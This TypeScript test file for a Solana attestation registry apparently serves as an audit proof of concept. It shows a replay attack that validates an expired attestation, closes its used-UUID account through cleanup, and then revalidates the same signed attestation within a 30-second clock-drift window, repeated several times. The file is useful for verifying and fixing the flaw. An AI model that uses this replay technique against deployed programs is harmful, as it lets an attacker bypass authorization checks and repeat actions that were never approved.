/**
 * UUID Replay Attack via Cleanup Vulnerability Test
 * 
 * This test demonstrates a critical vulnerability where an attacker can:
 * 1. Validate an attestation (creates UUID account)
 * 2. Immediately cleanup the UUID account (allowed because attestation expired)
 * 3. Revalidate the SAME attestation (still valid due to 30s clock drift buffer)
 * 4. Repeat steps 2-3 multiple times within the 30-second window
 * 
 * This completely bypasses the replay protection mechanism.
 */

import * as anchor from "@coral-xyz/anchor";
import { Program, BN } from "@coral-xyz/anchor";
import {
  Keypair,
  PublicKey,
  SystemProgram,
  Ed25519Program,
} from "@solana/web3.js";
import { PredicateRegistry } from "../../target/types/predicate_registry";
import { Counter } from "../../target/types/counter";
import {
  setupSharedTestContext,
  SharedTestContext,
} from "../helpers/shared-setup";
import {
  registerAttesterIfNotExists,
  setPolicyIdOrUpdate,
  findAttesterPDA,
  findPolicyPDA,
} from "../helpers/test-utils";
import nacl from "tweetnacl";
import * as crypto from "crypto";

describe("UUID Replay Attack via Cleanup Vulnerability", () => {
  let context: SharedTestContext;
  let program: Program<PredicateRegistry>;
  let counterProgram: Program<Counter>;
  let targetProgramId: PublicKey;
  let attester: Keypair;
  let attesterPda: PublicKey;
  let client: Keypair;
  let policyAccount: PublicKey;

  before(async () => {
    context = await setupSharedTestContext();
    program = context.program;

    // Get Counter program (target for validation)
    counterProgram = anchor.workspace.Counter as Program<Counter>;
    targetProgramId = counterProgram.programId;

    // Create test attester
    attester = Keypair.generate();

    // Register attester
    await registerAttesterIfNotExists(
      program,
      context.authority.keypair,
      attester.publicKey,
      context.registry.registryPda
    );

    [attesterPda] = findAttesterPDA(attester.publicKey, program.programId);

    // Create client (user calling the program)
    client = Keypair.generate();

    // Airdrop SOL to client for transactions
    const connection = program.provider.connection;
    const airdropSig = await connection.requestAirdrop(
      client.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );
    await connection.confirmTransaction(airdropSig);

    // Set policy for TARGET PROGRAM (not user)
    await setPolicyIdOrUpdate(
      program,
      targetProgramId,
      context.authority.keypair,
      "test-policy-uuid-replay",
      context.registry.registryPda
    );

    [policyAccount] = findPolicyPDA(targetProgramId, program.programId);
  });

  /**
   * Helper function to create a statement
   */
  function createStatement(uuid: number[], expiration: BN): any {
    return {
      uuid: uuid,
      msgSender: client.publicKey,
      target: targetProgramId,
      msgValue: new BN(0),
      encodedSigAndArgs: Buffer.from([
        // Discriminator for increment instruction
        0x0b, 0x3e, 0x8c, 0x4e, 0x5c, 0x8a, 0x8d, 0x5c,
      ]),
      policyId: "test-policy-uuid-replay",
      expiration,
    };
  }

  /**
   * Helper function to create message hash for signing
   */
  function createMessageHash(statement: any): Buffer {
    const data = Buffer.concat([
      Buffer.from(statement.uuid),
      statement.msgSender.toBuffer(),
      statement.target.toBuffer(),
      Buffer.from(statement.msgValue.toBuffer("le", 8)),
      statement.encodedSigAndArgs,
      Buffer.from(statement.policyId, "utf8"),
      Buffer.from(statement.expiration.toBuffer("le", 8)),
    ]);

    return crypto.createHash("sha256").update(data).digest();
  }

  /**
   * Helper function to find used UUID PDA
   */
  function findUsedUuidPDA(uuid: number[]): PublicKey {
    const [pda] = PublicKey.findProgramAddressSync(
      [Buffer.from("used_uuid"), Buffer.from(uuid)],
      program.programId
    );
    return pda;
  }

  it("demonstrates replay attack: validate -> cleanup -> validate with same attestation", async () => {
    // Step 1: Create an attestation that has ALREADY EXPIRED
    // This simulates the window where cleanup is allowed but validation still works
    const currentTime = Math.floor(Date.now() / 1000);
    const expiredTime = currentTime - 15; // Expired 15 seconds ago (within 30s buffer)
    
    const uuid = Array.from(crypto.randomBytes(16));
    const expiration = new BN(expiredTime);
    const statement = createStatement(uuid, expiration);

    const messageHash = createMessageHash(statement);
    const signature = nacl.sign.detached(messageHash, attester.secretKey);

    const attestation = {
      uuid: Array.from(uuid),
      attester: attester.publicKey,
      expiration,
      signature: Array.from(signature),
    };

    const usedUuidPda = findUsedUuidPDA(uuid);

    console.log("\n🔍 Test Setup:");
    console.log(`Current time: ${currentTime}`);
    console.log(`Attestation expired at: ${expiredTime}`);
    console.log(`Time since expiration: ${currentTime - expiredTime}s`);
    console.log(`Within validation buffer (30s): ${currentTime - expiredTime < 30 ? "YES ✅" : "NO ❌"}`);
    console.log(`Past expiration (cleanup allowed): ${currentTime > expiredTime ? "YES ✅" : "NO ❌"}`);

    // Step 2: First validation - should succeed despite expiration (within 30s buffer)
    console.log("\n🎯 Attempt 1: Validate expired attestation (within 30s buffer)");
    const ed25519Ix1 = Ed25519Program.createInstructionWithPublicKey({
      publicKey: attester.publicKey.toBytes(),
      message: messageHash,
      signature: Buffer.from(signature),
    });
    
    const validateTx1 = await program.methods
      .validateAttestation(
        statement.target,
        statement.msgValue,
        statement.encodedSigAndArgs,
        attester.publicKey,
        attestation
      )
      .accounts({
        registry: context.registry.registryPda,
        attesterAccount: attesterPda,
        policyAccount,
        usedUuidAccount: usedUuidPda,
        signer: client.publicKey,
        systemProgram: SystemProgram.programId,
        instructionsSysvar: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
      } as any)
      .preInstructions([ed25519Ix1])
      .signers([client])
      .rpc();

    console.log(`✅ First validation succeeded! TX: ${validateTx1}`);

    // Verify UUID account was created
    const uuidAccount1 = await program.account.usedUuidAccount.fetch(usedUuidPda);
    console.log(`✅ UUID account created at time: ${uuidAccount1.usedAt.toNumber()}`);

    // Step 3: Cleanup the UUID account (should succeed because attestation is expired)
    console.log("\n🧹 Cleaning up UUID account (attestation is expired)");
    const cleanupTx = await program.methods
      .cleanupExpiredUuid()
      .accounts({
        usedUuidAccount: usedUuidPda,
        signerRecipient: client.publicKey,
      } as any)
      .rpc();

    console.log(`✅ Cleanup succeeded! TX: ${cleanupTx}`);

    // Verify UUID account was deleted
    try {
      await program.account.usedUuidAccount.fetch(usedUuidPda);
      throw new Error("UUID account should have been deleted!");
    } catch (error) {
      if (error.message.includes("Account does not exist")) {
        console.log("✅ UUID account successfully deleted");
      } else {
        throw error;
      }
    }

    // Step 4: REPLAY ATTACK - Validate the SAME attestation again!
    console.log("\n⚠️  VULNERABILITY: Attempting to reuse the same attestation...");
    const ed25519Ix2 = Ed25519Program.createInstructionWithPublicKey({
      publicKey: attester.publicKey.toBytes(),
      message: messageHash,
      signature: Buffer.from(signature),
    });
    
    const validateTx2 = await program.methods
      .validateAttestation(
        statement.target,
        statement.msgValue,
        statement.encodedSigAndArgs,
        attester.publicKey,
        attestation
      )
      .accounts({
        registry: context.registry.registryPda,
        attesterAccount: attesterPda,
        policyAccount,
        usedUuidAccount: usedUuidPda,
        signer: client.publicKey,
        systemProgram: SystemProgram.programId,
        instructionsSysvar: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
      } as any)
      .preInstructions([ed25519Ix2])
      .signers([client])
      .rpc();

    console.log(`🚨 REPLAY ATTACK SUCCEEDED! TX: ${validateTx2}`);
    console.log("🚨 The same attestation was used twice!");

    console.log("\n" + "=".repeat(80));
    console.log("🚨 VULNERABILITY CONFIRMED!");
    console.log("=".repeat(80));
    console.log("The same attestation was successfully used TWICE.");
    console.log("This completely bypasses the replay protection mechanism.");
    console.log("Attack window: From expiration time to expiration + 30 seconds");
    console.log("Impact: An attacker can reuse a single attestation unlimited times");
    console.log("during the 30-second window, performing unauthorized actions repeatedly.");
    console.log("=".repeat(80));
  });

  it("demonstrates multiple replays within the 30-second window", async () => {
    // This test shows that you can repeat the attack many times
    const currentTime = Math.floor(Date.now() / 1000);
    const expiredTime = currentTime - 10; // Expired 10 seconds ago
    
    const uuid = Array.from(crypto.randomBytes(16));
    const expiration = new BN(expiredTime);
    const statement = createStatement(uuid, expiration);

    const messageHash = createMessageHash(statement);
    const signature = nacl.sign.detached(messageHash, attester.secretKey);

    const attestation = {
      uuid: Array.from(uuid),
      attester: attester.publicKey,
      expiration,
      signature: Array.from(signature),
    };

    const usedUuidPda = findUsedUuidPDA(uuid);

    console.log(`\n🔁 Attempting 3 replays of the same attestation...`);

    for (let i = 0; i < 3; i++) {
      console.log(`\n--- Replay ${i + 1}/3 ---`);
      
      // Validate
      const ed25519Ix = Ed25519Program.createInstructionWithPublicKey({
        publicKey: attester.publicKey.toBytes(),
        message: messageHash,
        signature: Buffer.from(signature),
      });
      
      await program.methods
        .validateAttestation(
          statement.target,
          statement.msgValue,
          statement.encodedSigAndArgs,
          attester.publicKey,
          attestation
        )
        .accounts({
          registry: context.registry.registryPda,
          attesterAccount: attesterPda,
          policyAccount,
          usedUuidAccount: usedUuidPda,
          signer: client.publicKey,
          systemProgram: SystemProgram.programId,
          instructionsSysvar: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
        } as any)
        .preInstructions([ed25519Ix])
        .signers([client])
        .rpc();
      
      console.log(`✅ Validation ${i + 1} succeeded`);

      // Cleanup (except on last iteration)
      if (i < 2) {
        await program.methods
          .cleanupExpiredUuid()
          .accounts({
            usedUuidAccount: usedUuidPda,
            signerRecipient: client.publicKey,
          } as any)
          .rpc();
        console.log(`🧹 Cleanup ${i + 1} succeeded`);
      }
    }
    
    console.log("\n" + "=".repeat(80));
    console.log(`🚨 VULNERABILITY CONFIRMED: 3 successful replays with ONE attestation!`);
    console.log("=".repeat(80));
  });
});

